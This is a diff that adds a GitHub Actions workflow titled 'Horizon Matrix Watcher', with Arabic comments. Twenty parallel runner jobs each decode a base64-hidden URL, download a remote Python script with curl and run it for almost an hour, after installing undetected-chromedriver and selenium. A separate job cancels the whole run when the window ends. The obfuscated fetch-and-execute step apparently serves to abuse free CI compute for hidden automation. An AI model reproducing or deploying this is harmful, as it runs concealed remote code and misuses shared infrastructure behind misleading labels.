@@ -1,0 +1,103 @@
+name: Horizon Matrix Watcher
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: horizon-core-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Guard: ينتظر 59 دقيقة ثم يلغي التشغيل بالكامل
+  # =================================================================
+  time-keeper:
+    name: "System Guard"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      WAIT_DURATION: 3540
+    steps:
+      - name: Activate Guard System
+        run: |
+          echo "[GUARD] Watchdog initiated for session: ${{ github.run_id }}"
+          echo "[GUARD] Monitoring active process for ${WAIT_DURATION} seconds."
+
+          sleep "${WAIT_DURATION}"
+
+          echo "[GUARD] Timeout reached — executing shutdown sequence."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[GUARD] Shutdown signal transmitted. Terminating all active nodes."
+
+  # =================================================================
+  # Matrix Workers: تشغيل متوازي لعقد النظام
+  # =================================================================
+  grid-workers:
+    name: "ClusterNode-${{ matrix.node_code }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_code: [m-1, m-2, m-3, m-4, m-5, m-6, m-7, m-8, m-9, 1m-, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120]
+
+    steps:
+      # #################################################################
+      # المرحلة الأولى: تجهيز البيئة
+      # #################################################################
+      - name: Prepare Environment
+        run: |
+          echo "[SETUP] Initializing ClusterNode-${{ matrix.node_code }} workspace..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # #################################################################
+      # المرحلة الثانية: جلب السكريبت الرئيسي
+      # #################################################################
+      - name: Fetch Core Script
+        run: |
+          echo "[FETCH] Downloading core payload..."
+          REMOTE_SRC=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$REMOTE_SRC" -o worker_task.py
+          echo "[FETCH] Core payload retrieved successfully."
+
+      # #################################################################
+      # المرحلة الثالثة: تثبيت المكتبات البرمجية
+      # #################################################################
+      - name: Install Dependencies
+        run: |
+          echo "[DEPS] Installing required Python libraries..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # #################################################################
+      # المرحلة الرابعة: تشغيل العملية الرئيسية (بحد أقصى 59 دقيقة)
+      # #################################################################
+      - name: Execute Task Engine
+        run: |
+          echo ">> Starting ClusterNode-${{ matrix.node_code }} engine..."
+
+          python3 worker_task.py &
+          TASK_PID=$!
+
+          echo ">> Engine running in background. Execution window: 3540 seconds."
+
+          sleep 3540
+
+          if kill -0 "$TASK_PID" 2>/dev/null; then
+            echo ">> Window elapsed — force stopping engine process."
+            kill -9 "$TASK_PID"
+            echo ">> Engine terminated by timeout supervisor."
+          else
+            echo ">> Engine finished execution naturally before timeout."
+          fi
